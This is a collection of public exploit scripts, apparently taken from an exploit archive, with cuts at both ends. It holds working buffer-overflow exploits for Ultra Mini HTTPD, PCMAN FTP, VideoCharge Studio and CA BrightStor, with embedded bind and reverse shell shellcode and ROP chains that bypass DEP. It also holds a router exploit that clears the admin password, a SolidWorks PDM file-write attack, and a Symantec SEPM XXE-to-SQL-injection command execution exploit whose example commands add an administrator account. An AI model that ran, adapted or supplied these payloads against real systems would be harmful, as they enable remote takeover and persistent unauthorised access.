s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((sys.argv[1],int(sys.argv[2])))
except:
	print "Can\'t connect to server!\n"
	sys.exit(0)



print "[+] Connecting to victim !"
data=s.recv(1024)
print "[+] "+data.rstrip()
print "[+] Sending evil buffer..."
s.send('A013 UID FETCH 4827313:4827313 '+ buffer + "\r\n")
s.close()
print "[+] Exploitation Successful\n"
print "[+] Please Connect to port 4444 on victim IP now !\n"



# Exploit Title: Ultra Mini HTTPD stack buffer overflow POST request
# Date: 16 Feb 2014
# Exploit Author: Sumit
# Vendor Homepage: http://www.picolix.jp/
# Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html
# Version: 1.21
# Tested on: Windows XP Professional SP3
#
# Description:
# A buffer overflow is triggered when requesting a very long url in POST request
#

import socket

shellcode = ( # msfvenom windows/shell_bind_tcp -b '\x00\x09\x0a\x0b\x0c\x0d\x20'
"\xd9\xea\xba\x03\xc9\x19\xa6\xd9\x74\x24\xf4\x58\x29\xc9" +
"\xb1\x56\x31\x50\x18\x83\xe8\xfc\x03\x50\x17\x2b\xec\x5a" +
"\xff\x22\x0f\xa3\xff\x54\x99\x46\xce\x46\xfd\x03\x62\x57" +
"\x75\x41\x8e\x1c\xdb\x72\x05\x50\xf4\x75\xae\xdf\x22\xbb" +
"\x2f\xee\xea\x17\xf3\x70\x97\x65\x27\x53\xa6\xa5\x3a\x92" +
"\xef\xd8\xb4\xc6\xb8\x97\x66\xf7\xcd\xea\xba\xf6\x01\x61" +
"\x82\x80\x24\xb6\x76\x3b\x26\xe7\x26\x30\x60\x1f\x4d\x1e" +
"\x51\x1e\x82\x7c\xad\x69\xaf\xb7\x45\x68\x79\x86\xa6\x5a" +
"\x45\x45\x99\x52\x48\x97\xdd\x55\xb2\xe2\x15\xa6\x4f\xf5" +
"\xed\xd4\x8b\x70\xf0\x7f\x58\x22\xd0\x7e\x8d\xb5\x93\x8d" +
"\x7a\xb1\xfc\x91\x7d\x16\x77\xad\xf6\x99\x58\x27\x4c\xbe" +
"\x7c\x63\x17\xdf\x25\xc9\xf6\xe0\x36\xb5\xa7\x44\x3c\x54" +
"\xbc\xff\x1f\x31\x71\x32\xa0\xc1\x1d\x45\xd3\xf3\x82\xfd" +
"\x7b\xb8\x4b\xd8\x7c\xbf\x66\x9c\x13\x3e\x88\xdd\x3a\x85" +
"\xdc\x8d\x54\x2c\x5c\x46\xa5\xd1\x89\xc9\xf5\x7d\x61\xaa" +
"\xa5\x3d\xd1\x42\xac\xb1\x0e\x72\xcf\x1b\x39\xb4\x01\x7f" +
"\x6a\x53\x60\x7f\x9d\xff\xed\x99\xf7\xef\xbb\x32\x6f\xd2" +
"\x9f\x8a\x08\x2d\xca\xa6\x81\xb9\x42\xa1\x15\xc5\x52\xe7" +
"\x36\x6a\xfa\x60\xcc\x60\x3f\x90\xd3\xac\x17\xdb\xec\x27" +
"\xed\xb5\xbf\xd6\xf2\x9f\x57\x7a\x60\x44\xa7\xf5\x99\xd3" +
"\xf0\x52\x6f\x2a\x94\x4e\xd6\x84\x8a\x92\x8e\xef\x0e\x49" +
"\x73\xf1\x8f\x1c\xcf\xd5\x9f\xd8\xd0\x51\xcb\xb4\x86\x0f" +
"\xa5\x72\x71\xfe\x1f\x2d\x2e\xa8\xf7\xa8\x1c\x6b\x81\xb4" +
"\x48\x1d\x6d\x04\x25\x58\x92\xa9\xa1\x6c\xeb\xd7\x51\x92" +
"\x26\x5c\x61\xd9\x6a\xf5\xea\x84\xff\x47\x77\x37\x2a\x8b" +
"\x8e\xb4\xde\x74\x75\xa4\xab\x71\x31\x62\x40\x08\x2a\x07" +
"\x66\xbf\x4b\x02" )

EIP = '\x53\x93\x42\x7E' # 7E429353 JMP ESP user.dll
payload = 'A'* 5438 + EIP + '\x90'*50 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))
buf = "POST / %s HTTP/1.1\r\nHost:127.0.0.1\r\n\r\n" % (payload)

s.send(buf)
s.close()
#!/usr/bin/env python
#
# WRT120N v1.0.0.7 stack overflow, ROP to 4-byte overwrite which clears the admin password.
#
# Craig Heffner
# http://www.devttys0.com
# 2014-02-14

import sys
import urllib2

try:
    target = sys.argv[1]
except IndexError:
    print "Usage: %s <target ip>" % sys.argv[0]
    sys.exit(1)

url = target + '/cgi-bin/tmUnblock.cgi'
if '://' not in url:
    url = 'http://' + url

post_data = "period=0&TM_Block_MAC=00:01:02:03:04:05&TM_Block_URL="
post_data += "B" * 246                  # Filler
post_data += "\x81\x54\x4A\xF0"         # $s0, address of admin password in memory
post_data += "\x80\x31\xF6\x34"         # $ra
post_data += "C" * 0x28                 # Stack filler
post_data += "D" * 4                    # ROP 1 $s0, don't care
post_data += "\x80\x34\x71\xB8"         # ROP 1 $ra (address of ROP 2)
post_data += "E" * 8                    # Stack filler

for i in range(0, 4):
    post_data += "F" * 4                # ROP 2 $s0, don't care
    post_data += "G" * 4                # ROP 2 $s1, don't care
    post_data += "\x80\x34\x71\xB8"     # ROP 2 $ra (address of itself)
    post_data += "H" * (4-(3*(i/3)))    # Stack filler; needs to be 4 bytes except for the
                                        # last stack frame where it needs to be 1 byte (to
                                        # account for the trailing "\n\n" and terminating
                                        # NULL byte)

try:
    req = urllib2.Request(url, post_data)
    res = urllib2.urlopen(req)
except urllib2.HTTPError as e:
    if e.code == 500:
        print "OK"
    else:
        print "Received unexpected server response:", str(e)
except KeyboardInterrupt:
    pass
#!/usr/bin/python
# Exploit Title: VideoCharge Studio v2.12.3.685 GetHttpResponse() MITM Remote Code Execution Exploit (SafeSEH/ASLR/DEP Bypass)
# Version:       v2.12.3.685
# Date:          2014-02-19
# Author:        Julien Ahrens (@MrTuxracer)
# Homepage:      http://www.rcesecurity.com
# Software Link: http://www.videocharge.com
# Tested on:     Win7-GER (DEP enabled)
#
# Howto / Notes:
# Since it's a MITM RCE you need to spoof the DNS Record for www.videocharge.com in order to successfully exploit this vulnerability
#

from socket import *
from struct import pack
from time import sleep
 
host = "192.168.0.1"
port = 80
 
s = socket(AF_INET, SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print "\n[+] Listening on %d ..." % port
 
cl, addr = s.accept()
print "[+] Connection accepted from %s" % addr[0]
 
# Thanks Giuseppe D'Amore for the amazing shellcode
# http://www.exploit-db.com/exploits/28996/
shellcode = ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"+
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"+
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"+
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"+
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"+
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"+
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"+
"\x49\x0b\x31\xc0\x51\x50\xff\xd7")

junk0 = "\x90" * 1277
junk1 = "\x90" * 1900
nops="\x90" * 30
jmpesp=pack('<L',0x102340e8) * 5 # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]

# jump to controlled memory
eip=pack('<L',0x61b84af1) # {pivot 4124 / 0x101c} # ADD ESP,101C # RETN [zlib1.dll]

#
# ROP registers structure:
# EBP - VirtualProtect() call
# ESP - lpAddress
# EBX - dwSize
# EDX - flNewProtect
# ECX - lpflOldProtect
#

# Craft VirtualProtect() call (0x0080D816) via [DE2D66F9 XOR DEADBEEF] and MOV to EBP
rop = pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0xDE2D66F9) # XOR param 1
rop += pack('<L',0x10206ac5) # POP EBX # RETN [cc.dll]
rop += pack('<L',0xDEADBEEF) # XOR param 2
rop += pack('<L',0x1002fb27) # XOR EDI,EBX # ADD DL,BYTE PTR DS:[EAX] # RETN [cc.dll]
rop += pack('<L',0x101f7572) # MOV EAX,EDI # POP EDI # RETN [cc.dll]  
rop += pack('<L',0xDEADBEEF) # Filler
rop += pack('<L',0x101fbc62) # XCHG EAX,EBP # RETN [cc.dll]

# Craft VirtualProtect() dwSize in EAX and MOV to EBX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x101f2adc) # ADD EAX,500 # RETN [cc.dll]
rop += pack('<L',0x1023ccfb) # XCHG EAX,EBX # RETN [cc.dll] 

# Craft VirtualProtect() flNewProtect in EAX and MOV to EDX
rop += pack('<L',0x101e66a0) # XOR EAX,EAX # RETN [cc.dll]
rop += pack('<L',0x102026a1) # ADD EAX,25 # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102155aa) # ADD EAX,0C # RETN [cc.dll]
rop += pack('<L',0x102026b1) # ADD EAX,3 # RETN [cc.dll]
rop += pack('<L',0x101ff01d) # XCHG EAX,ECX # RETN [cc.dll]
rop += pack('<L',0x61b90402) # MOV EDX,ECX # RETN [zlib1.dll]

# Put writable offset for VirtualProtect() lpflOldProtect to ECX
rop += pack('<L',0x1020aacf) # POP ECX # RETN [cc.dll]
rop += pack('<L',0x61B96180) # writable location [zlib1.dll]

# POP a value from the stack after PUSHAD and POP value to ESI 
# as a preparation for the VirtualProtect() call
rop += pack('<L',0x61b850a4) # POP ESI # RETN [zlib1.dll]
rop += pack('<L',0x61B96180) # writable location from [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]
rop += pack('<L',0x61b849b6) # POP EDI # RETN [zlib1.dll]

# Achievement unlocked: PUSHAD
rop += pack('<L',0x101e93d6) # PUSHAD # RETN [cc.dll] 
rop += pack('<L',0x102340c5) # jmp esp |  {PAGE_EXECUTE_READ} [cc.dll]

payload = junk0 + eip + junk1 + rop + jmpesp + nops + shellcode

buffer = "HTTP/1.1 200 OK\r\n"
buffer += "Date: Sat, 09 Feb 2014 13:33:37 GMT\r\n"
buffer += "Server: Apache/2.2.9 (Debian) PHP/5.2.6-1+lenny16 with Suhosin-Patch mod_ssl/2.2.9 OpenSSL/0.9.8g\r\n"
buffer += "X-Powered-By: PHP/5.2.6-1+lenny16\r\n"
buffer += "Vary: Accept-Encoding\r\n"
buffer += "Content-Length: 4000\r\n"
buffer += "Connection: close\r\n"
buffer += "Content-Type: text/html\r\n\r\n"
buffer += payload
buffer += "\r\n"
 
print cl.recv(1000)

cl.send(buffer)

print "[+] Sending exploit: OK\n"

sleep(3)
cl.close()
s.close()
# Exploit Title: PCMAN FTP 2.07 Long Command Buffer Overflow (unauthenticated)
# Date: Feb 19, 2014
# Exploit Author: Sumit
# Version: 2.07
# Tested on: Windows XP Professional SP3
# Description: Buffer overflow is triggered upon sending long string to PCMAN FTP 2.07 in place of command
#

import socket
import datetime

"""
You have to take into account your IP addr and servers date (if using NAT, check external IP) as buffer starts like the following:
2014/2/20 [00:40] (00320) 127.0.0.100> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
"""

host = '192.168.213.10'

d = str(datetime.datetime.today()).split()[0].split('-') # You should ideally consider servers date here
for i in range(len(d)): d[i] = str(int(d[i]))
d = '/'.join(d)	# Finally we got the date

# msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d'
shellcode = (
"\xda\xdb\xd9\x74\x24\xf4\xbe\xb5\x40\x16\xb6\x5b\x2b\xc9" +
"\xb1\x56\x31\x73\x18\x83\xeb\xfc\x03\x73\xa1\xa2\xe3\x4a" +
"\x21\xab\x0c\xb3\xb1\xcc\x85\x56\x80\xde\xf2\x13\xb0\xee" +
"\x71\x71\x38\x84\xd4\x62\xcb\xe8\xf0\x85\x7c\x46\x27\xab" +
"\x7d\x66\xe7\x67\xbd\xe8\x9b\x75\x91\xca\xa2\xb5\xe4\x0b" +
"\xe2\xa8\x06\x59\xbb\xa7\xb4\x4e\xc8\xfa\x04\x6e\x1e\x71" +
"\x34\x08\x1b\x46\xc0\xa2\x22\x97\x78\xb8\x6d\x0f\xf3\xe6" +
"\x4d\x2e\xd0\xf4\xb2\x79\x5d\xce\x41\x78\xb7\x1e\xa9\x4a" +
"\xf7\xcd\x94\x62\xfa\x0c\xd0\x45\xe4\x7a\x2a\xb6\x99\x7c" +
"\xe9\xc4\x45\x08\xec\x6f\x0e\xaa\xd4\x8e\xc3\x2d\x9e\x9d" +
"\xa8\x3a\xf8\x81\x2f\xee\x72\xbd\xa4\x11\x55\x37\xfe\x35" +
"\x71\x13\xa5\x54\x20\xf9\x08\x68\x32\xa5\xf5\xcc\x38\x44" +
"\xe2\x77\x63\x01\xc7\x45\x9c\xd1\x4f\xdd\xef\xe3\xd0\x75" +
"\x78\x48\x99\x53\x7f\xaf\xb0\x24\xef\x4e\x3a\x55\x39\x95" +
"\x6e\x05\x51\x3c\x0e\xce\xa1\xc1\xdb\x41\xf2\x6d\xb3\x21" +
"\xa2\xcd\x63\xca\xa8\xc1\x5c\xea\xd2\x0b\xeb\x2c\x1d\x6f" +
"\xb8\xda\x5c\x8f\x2f\x47\xe8\x69\x25\x67\xbc\x22\xd1\x45" +
"\x9b\xfa\x46\xb5\xc9\x56\xdf\x21\x45\xb1\xe7\x4e\x56\x97" +
"\x44\xe2\xfe\x70\x1e\xe8\x3a\x60\x21\x25\x6b\xeb\x1a\xae" +
"\xe1\x85\xe9\x4e\xf5\x8f\x99\xf3\x64\x54\x59\x7d\x95\xc3" +
"\x0e\x2a\x6b\x1a\xda\xc6\xd2\xb4\xf8\x1a\x82\xff\xb8\xc0" +
"\x77\x01\x41\x84\xcc\x25\x51\x50\xcc\x61\x05\x0c\x9b\x3f" +
"\xf3\xea\x75\x8e\xad\xa4\x2a\x58\x39\x30\x01\x5b\x3f\x3d" +
"\x4c\x2d\xdf\x8c\x39\x68\xe0\x21\xae\x7c\x99\x5f\x4e\x82" +
"\x70\xe4\x7e\xc9\xd8\x4d\x17\x94\x89\xcf\x7a\x27\x64\x13" +
"\x83\xa4\x8c\xec\x70\xb4\xe5\xe9\x3d\x72\x16\x80\x2e\x17" +
"\x18\x37\x4e\x32")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 21))

nop = '\x90'*50
eip = '\x53\x93\x42\x7E' # EIP = 7E429353; JMP ESP in USER32.dll
myip = s.getsockname()[0]
padding = 'A' * (2029 - (len(d) + len(myip)))

buf = padding + eip + nop + shellcode

s.send('%s\r\n' % (buf))
s.recv(1024)
print 'Payload sent'
s.close()
#!/usr/bin/python
#
# Title: Mini HTTPD stack buffer overflow POST exploit
# Author: TheColonial
# Date: 20 Feb 2013
# Software Link: http://www.vector.co.jp/soft/winnt/net/se275154.html
# Vendor Homepage: http://www.picolix.jp/
# Version: 1.21
# Tested on: Windows XP Professional SP3
#
# Description:
# This is a slightly more weaponised version of the Mini HTTPD buffer overflow
# written by Sumit, located here: http://www.exploit-db.com/exploits/31736/
# I wrote this up because the existing version had a hard-coded payload and
# didn't work on any of my XP boxes.
#
# The instability of the existing is down to bad chars, and the parent thread
# killing off the child thread when the thing is still running. This exploit
# allocates memory in a safe area, copies the payload to it, creates a new
# thread which runs the payload and then suspends the current thread. The
# suspending of the thread forces the parent to kill it off rather than let
# it crash and potentially bring the process down.
#
# Run the script without arguments to see usage.

import struct, socket, sys, subprocess

# Helper function that reads the body of files off disk.
def file_content(path):
  with open(path, 'rb') as f:
    return f.read()

# Sent the payload in the correct format to the target host/port.
def pwn(host, port, payload):
  print "[*] Connecting to {0}:{1}...".format(host, port)
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  print "[*] Connected, sending payload {0} bytes...".format(len(payload))
  payload = "POST /{0} HTTP/1.1\r\nHost: {1}\r\n\r\n".format(payload, host)
  s.send(payload)
  s.shutdown
  s.close
  print "[+] Payload of {0} bytes sent, hopefully your shellcode executed.".format(len(payload))

# Create the part of the payload creates a thread to run the final payload in.
def create_payload_thread(final_payload_size):
  VirtualAlloc = struct.pack("<L", 0x7c809AE1)   # in kernel32
  CreateThread = struct.pack("<L", 0x7c8106c7)   # in kernel32
  SuspendThread = struct.pack("<L", 0x7c83974A)  # in kernel32

  payload  = ""
  payload += "\x83\xec\x02"   # add esp, 0x2 (aligns the stack)
  payload += "\x89\xe6"       # mov esi, esp
  payload += "\x83\xc6\x00"   # add esi, <some offset filled later>
  count_offset = len(payload) - 1

  # zero out ebx because we use zero a lot
  payload += "\x31\xdb"             # xor ebx,ebx

  # allocate some memory to store our shellcode in which is
  # away from the current active area and somewhere safe
  payload += "\x6a\x40"             # push 0x40
  payload += "\x68\x00\x30\x00\x00" # push 0x3000
  payload += "\x68\x00\x10\x00\x00" # push 0x1000
  payload += "\x53"                 # push ebx
  payload += "\xB8" + VirtualAlloc  # mov eax,<address>
  payload += "\xff\xd0"             # call eax

  # copy the payload over to the newly allocated area
  size_bin = struct.pack("<L", final_payload_size + 4)
  payload += "\xb9" + size_bin      # mov ecx,final_payload_size
  payload += "\x89\xc7"             # mov edi,eax
  payload += "\xf2\xa4"             # rep movsb

  # create the thread with a starting address pointing to the
  # allocated area of memory
  payload += "\x53"                 # push ebx
  payload += "\x53"                 # push ebx
  payload += "\x53"                 # push ebx
  payload += "\x50"                 # push eax
  payload += "\x53"                 # push ebx
  payload += "\x53"                 # push ebx
  payload += "\xB8" + CreateThread  # mov eax,<address>
  payload += "\xff\xd0"             # call eax

  # We call SuspendThread on the current thread, because this
  # forces the parent to kill it. The bonus here is that doing
  # so prevents the thread from dying and bringing the whole
  # process down.
  payload += "\x4b"                 # dec ebx
  payload += "\x4b"                 # dec ebx
  payload += "\x53"                 # push ebx
  payload += "\xB8" + SuspendThread # mov eax,<address>
  payload += "\xff\xd0"             # call eax
  payload += "\x90" * 4

  # fill in the correct offset so that we point ESI to the
  # right location at the start of the final payload
  size = len(payload) + final_payload_size % 4

  print "[*] Final stage is {0} bytes.".format(final_payload_size)

  offset = struct.pack("B", size)

  # write the value to the payload at the right location and return
  return payload[0:count_offset] + offset + payload[count_offset+1:len(payload)]

# Creates the first stage of the exploit which overwrite EIP to get control.
def create_stage1():
  eip_offset = 5412
  jmp_esp = struct.pack("<L", 0x7e4456F7) # JMP ESP in advapi32

  eip_offset2 = eip_offset + 4

  payload  = ""
  payload += "A" * eip_offset    # padding to reach EIP overwrite
  payload += jmp_esp             # address to overwrite IP with
  payload += "\x90"              # alignment
  payload += "\x83\xEC\x21"      # rejig ESP
  return payload

# Create encoded shellcode from the given payload.
def create_encoded_shellcode(payload):
  print "[*] Input payload of {0} bytes received. Encoding...".format(len(payload))
  params = ['msfencode', '-e', 'x86/opt_sub', '-t', 'raw',
      'BufferRegister=ESP', 'BufferOffset=42', 'ValidCharSet=filepath']
  encode = subprocess.Popen(params, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
  shellcode, _ = encode.communicate(payload)
  print "[*] Shellcode of {0} bytes generated.".format(len(shellcode))
  return shellcode

print ""
print "MiniHTTPd 1.21 exploit for WinXP SP3 - by TheColonial"
print "-----------------------------------------------------"
print ""
print " Note: msfencode must be in the path and Metasploit must be up to date."

if len(sys.argv) != 4:
  print ""
  print " Usage: {0} <host> <port> <payloadfile>".format(sys.argv[0])
  print ""
  print "          host : IP/name of the target host."
  print "          port : Port that the target is running on."
  print "   payloadfile : A file with the raw payload that is to be run."
  print "                 This should be the raw, non-encoded output of"
  print "                 a call to msfpayload"
  print ""
  print "   eg. {0} 192.168.1.1 80 reverse_shell_raw.bin"
  print ""
else:
  print ""
  print "   Make sure you have your listeners running!"
  print ""

  host = sys.argv[1]
  port = int(sys.argv[2])
  payload_file = sys.argv[3]
  stage1 = create_stage1()
  final_stage = file_content(payload_file)
  thread_payload = create_payload_thread(len(final_stage))
  shellcode = create_encoded_shellcode(thread_payload + final_stage)
  padding = "A" * 0x10
  pwn(host, port, stage1 + shellcode + padding)

'''
# Title: SolidWorks Workgroup PDM 2014 SP2 Arbitrary File Write Vulnerability
# Date: 2-21-2014
# Author: Mohamed Shetta
Email: mshetta |at| live |dot| com
# Vendor Homepage: http://www.solidworks.com/sw/products/product-data-management/workgroup-pdm.htm
# Tested on: Windows 7
#Vulnerability type: Arbitrary File Write
#Vulnerable file: pdmwService.exe
#PORT: 30000


---------------------------------------------------------------------------------------------------------
Software Description:

SolidWorks
Workgroup PDM is a PDM tool that allows SolidWorks users operating in 
teams of 10 members or less to work on designs concurrently. With 
SolidWorks PDM Workgroup, designers can search, revise, and vault CAD 
data while maintaining an accurate design history.


---------------------------------------------------------------------------------------------------------
Vulnerability Details:

This vulnerability allows remote attackers to write arbitrary file on vulnerable installations of SolidWorks Workgroup PDM.

------------------------------------------------------------------------------------------------------------
Disclosure timeline:

12/15/2013 - Vendor notified and no response.
2/21/2014 - Public disclosure
'''

#!/usr/bin/env python
  
import socket
import struct
import ctypes

FileName="\x2E\x00\x2E\x00\x5C\x00\x2E\x00\x2E\x00\x5C\x00\x74\x00\x65\x00\x73\x00\x74\x00" #..\..\test
Data="A"*1028
FileSize=len(Data)
FNsz=len(FileName)
OpCode="\xD0\x07\x00\x00"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.4", 30000))
s.send(OpCode)
s.send(struct.pack("I", FNsz))
s.send(FileName)
s.send(struct.pack('<Q', FileSize))
s.send(Data)
import argparse
import httplib

"""
Exploit Title: Symantec Endpoint Protection Manager Remote Command Execution
Exploit Author: Chris Graham @cgrahamseven
CVE: CVE-2013-5014, CVE-2013-5015
Date: February 22, 2014
Vendor Homepage: http://www.symantec.com/endpoint-protection
Version: 11.0, 12.0, 12.1
Tested On: Windows Server 2003, default SEPM install using embedded database
References: https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt
http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=&suid=20140213_00
Details:

First off, this was a fantastic discovery by Stefan Viehbock. The abuse of the XXE 
injection to force SEPM to exploit itself through a separate SQL injection flaw was 
particularly amusing. I suspect the majority of SEPM users will have it configured
with the default embedded database, thereby making this a pretty reliable exploit.

So basically what you are looking for with the XXE injection is a vulnerability 
that can be triggered in the ConsoleServlet. When a multipart http request is sent, 
the servlet will use a custom MultipartParser class to handle the individual 
multipart bodies. When a body is encountered that uses a Content-Type of text/xml, 
the Java DocumentBuilder class is used to parse the xml. Since Symantec did not 
disallow declared DTD processing, it is vulnerable to the XXE injection. This 
appears to be a blind XXE, so a better use of the vulnerability is use it for SSRF.
That leads us to the SQL injection flaw.

Symantec has an http request handler called ConfigServerHandler that is programmatically 
restricted to only handle requests that come from localhost. I guess when they wrote this 
they just assumed that there was never going to be a way to send untrusted input to it 
since it was always going to be controlled by them. I base this guess on the fact that 
there is absolutely no attempt made to validate what input comes in to the 
updateReportingVersion function which shoves it directly into a SQL query unfiltered. In 
order to trigger the SQL injection you just need to send the SQL injection string in the 
"Parameter" url param with the "action" param set to test_av. On a default install of SEPM, 
it uses a SQL Anywhere embedded database. Much like MSSQL, SQL Anywhere has an xp_cmdshell 
stored procedure to run local OS commands. Using this stored procedure, you can compromise 
the server that is running SEPM. 

Example Usage: 
python sepm_xxe_exploit.py -t 192.168.1.100 -c "net user myadmin p@ss!23 /add"
python sepm_xxe_exploit.py -t 192.168.1.100 -c "net localgroup Administrators myadmin /add"
"""

multipart_body = \
"------=_Part_156_33010715.1234\r\n" + \
"Content-Type: text/xml\r\n" + \
"Content-Disposition: form-data; name=\"Content\"\r\n\r\n" + \
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n" + \
"<!DOCTYPE sepm [<!ENTITY payload SYSTEM " + \
"\"http://127.0.0.1:9090/servlet/ConsoleServlet?ActionType=ConfigServer&action=test_av" + \
"&SequenceNum=140320121&Parameter=a'; call xp_cmdshell('%s');--\" >]>\r\n" + \
"<request>\r\n" + \
"<xxe>&payload;</xxe>\r\n" + \
"</request>\r\n" + \
"------=_Part_156_33010715.1234--\r\n"
headers = {'Content-Type':"multipart/form-data; boundary=\"----=_Part_156_33010715.1234\""}

cmdline_parser = argparse.ArgumentParser(description='Symantec Endpoint Protection Manager' + \
' Remote Command Execution')
cmdline_parser.add_argument('-t', dest='ip', help='Target IP', required=True)
cmdline_parser.add_argument('-p', dest='port', help='Target Port', default=9090, \
type=int, required=False)
cmdline_parser.add_argument('-ssl', dest='ssl', help='Uses SSL (set to 1 for true)', \
default=0, type=int, required=False)
cmdline_parser.add_argument('-c', dest='cmd', help='Windows cmd to run (must be in quotes ie "net user")', \
required=True)
args = cmdline_parser.parse_args()

if args.ssl == 1:
    conn = httplib.HTTPSConnection(args.ip, args.port)
else:
    conn = httplib.HTTPConnection(args.ip, args.port)
multipart_body = multipart_body % (args.cmd)
print "\n[*]Attempting to exploit XXE and run local windows command: " + args.cmd
conn.request("POST", "/servlet/ConsoleServlet?ActionType=ConsoleLog", multipart_body, headers)
res = conn.getresponse()
if res.status != 200:
    print "[-]Exploit unsuccessful! Server returned:\n" + res.read()
else:
    print "[+]Exploit successfully sent!"
#!/usr/bin/env python

'''
# Exploit Title: python socket.recvfrom_into() remote buffer overflow
# Date: 21/02/2014
# Exploit Author: @sha0coder
# Vendor Homepage: python.org
# Version: python2.7 and python3
# Tested on: linux 32bit + python2.7
# CVE : CVE-2014-1912



socket.recvfrom_into() remote buffer overflow Proof of concept
by @sha0coder

TODO: rop to evade stack nx 


(gdb) x/i $eip
=> 0x817bb28:	mov    eax,DWORD PTR [ebx+0x4]       <--- ebx full control => eax full conrol
   0x817bb2b:	test   BYTE PTR [eax+0x55],0x40
   0x817bb2f:	jne    0x817bb38 -->
   ...
   0x817bb38:	mov    eax,DWORD PTR [eax+0xa4]      <--- eax full control again
   0x817bb3e:	test   eax,eax
   0x817bb40:	jne    0x817bb58 -->
   ...
   0x817bb58:	mov    DWORD PTR [esp],ebx
   0x817bb5b:	call   eax <--------------------- indirect fucktion call ;)


$ ./pyrecvfrominto.py 
	egg file generated

$ cat egg | nc -l 8080 -vv

... when client connects ... or wen we send the evil buffer to the server ...

0x0838591c in ?? ()
1: x/5i $eip
=> 0x838591c:	int3    			<--------- LANDED!!!!!
   0x838591d:	xor    eax,eax
   0x838591f:	xor    ebx,ebx
   0x8385921:	xor    ecx,ecx
   0x8385923:	xor    edx,edx

'''

import struct

def off(o):
	return struct.pack('L',o)


reverseIP = '\xc0\xa8\x04\x34'   #'\xc0\xa8\x01\x0a'
reversePort = '\x7a\x69'


#shellcode from exploit-db.com, (remove the sigtrap)
shellcode = "\xcc\x31\xc0\x31\xdb\x31\xc9\x31\xd2"\
			"\xb0\x66\xb3\x01\x51\x6a\x06\x6a"\
			"\x01\x6a\x02\x89\xe1\xcd\x80\x89"\
			"\xc6\xb0\x66\x31\xdb\xb3\x02\x68"+\
			reverseIP+"\x66\x68"+reversePort+"\x66\x53\xfe"\
			"\xc3\x89\xe1\x6a\x10\x51\x56\x89"\
			"\xe1\xcd\x80\x31\xc9\xb1\x03\xfe"\
			"\xc9\xb0\x3f\xcd\x80\x75\xf8\x31"\
			"\xc0\x52\x68\x6e\x2f\x73\x68\x68"\
			"\x2f\x2f\x62\x69\x89\xe3\x52\x53"\
			"\x89\xe1\x52\x89\xe2\xb0\x0b\xcd"\
			"\x80"


shellcode_sz = len(shellcode)

print 'shellcode sz %d' % shellcode_sz


ebx =  0x08385908
sc_off = 0x08385908+20

padd = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMM'

'''           
        +------------+----------------------+         +--------------------+
        |            |                      |         |                    |
        V            |                      |         V                    |
'''
buff = 'aaaa' + off(ebx) + 'aaaaaAAA'+ off(ebx) + shellcode + padd + off(sc_off)  # .. and landed ;)


print 'buff sz: %s' % len(buff)
open('egg','w').write(buff)
#!/usr/bin/python
# I couldnt find a reliable exploit for my analysis and so came up with this.
# Remote exploit for the CA BrightStor msgeng.exe service heap overflow
# vulnerability as described in LS-20060313.pdf on lssec.com. The exploit was
# tested on windows 2000 SP0. Opens a shell on TCP port 4444. Shouldnt be hard
# to port to other platforms. The exploit overwrites the
# UnhandledExceptionFilter in windows 2000 SP0 (located at 77EE044C) with the
# address of call dword ptr [esi +4C] located in user32.dll. At the time when
# UEF is called esi +4C contains a pointer to our shellcode.
#
# Winny M Thomas ;-)
# Author shall bear no responsibility for any screw ups caused by using this code

from impacket.dcerpc import transport, dcerpc
from impacket import uuid
import struct
import sys

def DCEconnectAndExploit(target):
       trans = transport.TCPTransport(target, 6503)
       trans.connect()
       dce = dcerpc.DCERPC_v5(trans)
       dce.bind(uuid.uuidtup_to_bin(('dc246bf0-7a7a-11ce-9f88-00805fe43838', '1.0')))

       request = "A" * 676
       request += "\x90\x90\x90\x90"
       request += "\x90\x90\xeb\x0a"

       #Call dword ptr [esi +4C] from user32.dll
       request += struct.pack("<L", 0x77E4FB7A)
       #Overwrite UnhandledExceptionFilter in Windows 2000 SP0
